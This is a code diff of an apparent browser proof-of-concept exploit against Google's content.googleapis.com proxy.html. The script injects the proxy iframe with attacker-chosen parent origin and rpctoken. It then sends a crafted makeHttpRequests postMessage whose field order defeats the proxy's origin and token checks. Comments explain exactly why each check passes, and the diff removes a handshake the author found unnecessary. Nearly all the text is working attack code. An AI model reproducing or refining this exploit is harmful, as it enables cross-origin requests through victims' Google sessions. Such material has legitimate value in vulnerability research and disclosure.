@@ -93,10 +93,10 @@ if (typeof gapi !== 'undefined' || document.querySelector('script[src*="apis.goo
 
 // Step 1: Inject proxy iframe with attacker-controlled hash.
 // proxy.html reads #parent, #rpctoken, #origin on load.
-// makeHttpRequests checks:
-//   this.f == ".."                          ← we send s:".."   ✓
-//   this.t == rpcToken from hash            ← we set both      ✓
-//   this.origin == origin from hash         ← we set both      ✓
+// makeHttpRequests checks (all pass with correct s/f field order):
+//   this.f == ".."                          ← we send f:".."                 ✓
+//   this.t == _.$f.io("..")                 ← D[".."] = aa.rpctoken = TOKEN   ✓
+//   this.origin == _.$f.zo("..")            ← C[".."] = aa.parent = our origin ✓
 const proxyUrl = 'https://content.googleapis.com/static/proxy.html?usegapi=1' +
   '#parent=' + encodeURIComponent(parentOrigin) +
   '&rpctoken=' + rpcToken +
@@ -110,25 +110,19 @@ document.body.appendChild(proxyIframe);
 log('ok', 'Proxy iframe injected.');
 log('warn', 'Waiting 3s for googleapis.proxy.js → googleapis.server.init() → makeHttpRequests registered...');
 
-// Step 2: Message loop — handles both the ready/ACK handshake and the callback.
+// Message handler — ready signal + callback.
 //
-// HOW THE GAPI XD3 HANDSHAKE WORKS:
-//   1. Proxy sends ready signal: {s:"ready:TOKEN", g:true, c:0, ...}
-//      g:true = proxy expects ACK. Without ACK, the proxy never registers
-//      our page as the trusted parent for frame ".." — so _.$f.zo("..") stays
-//      blank, and the makeHttpRequests origin check fails:
-//        "Invalid rpc message origin. [blank] vs [our_origin]"
-//        (blank = _.$f.zo("..") unset, our_origin = event.origin of our msg)
+// GAPI gadgets.rpc field semantics:
+//   s = service/function name ("makeHttpRequests")
+//   f = sender frame ID (".." = parent)
 //
-//   2. Parent sends ACK: {s:"..", f:"", c:0, t:TOKEN, g:false}
-//      This is received by the proxy from event.origin = parentOrigin.
-//      GAPI stores event.origin as _.$f.zo("..") = our_origin.
+// The proxy validator: k = _.$f.zo(h.f)
+//   With f=".." → k = aa.parent = our origin → event.origin match → PASSES
 //
-//   3. Parent sends makeHttpRequests.
-//      Now: this.origin (event.origin) == _.$f.zo("..") → CHECK PASSES.
+// Token: _.jf.register fires $a() SYNCHRONOUSLY → D[".."] = aa.rpctoken = our token.
+// No ACK needed.
 //
 let responseHandled = false;
-let ackSent = false;
 let requestSent = false;
 
 window.addEventListener('message', function(e) {
@@ -141,34 +135,13 @@ window.addEventListener('message', function(e) {
   try { msg = JSON.parse(e.data); } catch(err) { return; }
   if (!msg) return;
 
-  // ---- STEP A: Handle ready signal → send ACK ----
-  // Ready signal: {s:"ready:TOKEN", f:"", c:0, g:true, t:TOKEN}
-  if (!ackSent && msg.s && msg.s.startsWith('ready:') && msg.g === true) {
-    ackSent = true;
-    log('ok', 'Ready signal received (g:true = ACK expected). Sending ACK to register our origin...');
-
-    // ACK mirrors the ready signal back as parent frame "..".
-    // Receiving this ACK causes proxy GAPI to store event.origin (our page)
-    // as the registered origin for frame "..", populating _.$f.zo("..").
-    // We try two ACK formats to cover both GAPI relay variants:
-    const ack = JSON.stringify({
-      s: '..',            // "I am the parent frame"
-      f: msg.s,           // address back to the proxy's self-ID: "ready:TOKEN"
-      c: msg.c,           // echo back the call ID (0)
-      a: [],
-      t: rpcToken,        // our rpcToken
-      l: null,
-      g: false
-    });
-
-    proxyIframe.contentWindow.postMessage(ack, 'https://content.googleapis.com');
-    log('ok', 'ACK sent. Waiting 500ms then sending makeHttpRequests...');
-
-    // Small delay for GAPI to process ACK and register our origin
-    setTimeout(sendMakeHttpRequests, 500);
+  // Ready signal: proxy is alive, token registered. Send immediately.
+  if (msg.s && msg.s.startsWith('ready:') && !requestSent) {
+    log('ok', 'Ready signal received. Sending makeHttpRequests...');
+    sendMakeHttpRequests();
   }
 
-  // ---- STEP B: Handle makeHttpRequests callback ----
+  // Callback: proxy sends {f:"_callbacks_.callId", a:[null, responses], ...}
   if (responseHandled) return;
   if (!msg.f || !msg.f.includes('_callbacks_')) return;
 
@@ -218,8 +191,7 @@ function sendMakeHttpRequests() {
   if (requestSent) return;
   requestSent = true;
 
-  log('ok', 'Sending makeHttpRequests to proxy via postMessage...');
-  log('ok', 'ACK already sent → _.$f.zo("..") should now equal our origin → check passes.');
+  log('ok', 'Sending makeHttpRequests (s:"makeHttpRequests" f:"..")...');
 
   const requests = [
     {
@@ -243,8 +215,8 @@ function sendMakeHttpRequests() {
 
   proxyIframe.contentWindow.postMessage(
     JSON.stringify({
-      s: '..',
-      f: 'makeHttpRequests',
+      s: 'makeHttpRequests',
+      f: '..',
       c: 'poc-req-1',
       a: [requests],
       t: rpcToken,
@@ -257,22 +229,18 @@ function sendMakeHttpRequests() {
   log('ok', 'Sent. Waiting for callback...');
 }
 
-// Fallback: if no ready signal in 5s, try sending without ACK (some GAPI versions may not need it)
+// Fallback if no ready signal in 5s
 setTimeout(function() {
-  if (!ackSent) {
-    log('warn', '5s: No ready signal received. Trying makeHttpRequests without ACK...');
+  if (!requestSent) {
+    log('warn', '5s: No ready signal received. Sending anyway (token set synchronously)...');
     sendMakeHttpRequests();
   }
 }, 5000);
 
-// Diagnostic if nothing comes back after 15s
 setTimeout(function() {
   if (!responseHandled) {
     log('warn', '15s timeout — no response.');
-    log('warn', '  Check: did PROXY→PARENT show the ready signal ({s:"ready:...",g:true})?');
-    log('warn', '  Check: did makeHttpRequests trigger "Invalid rpc message origin" again?');
-    log('warn', '  If origin check STILL fails after ACK → try ACK format variant below.');
-    log('warn', '  If no ready signal at all → proxy iframe may be blocked (HTTPS required).');
+    log('warn', '  Check: proxy ready signal? Origin error in console? Still 401 (need login)?');
   }
 }, 15000);
 </script>
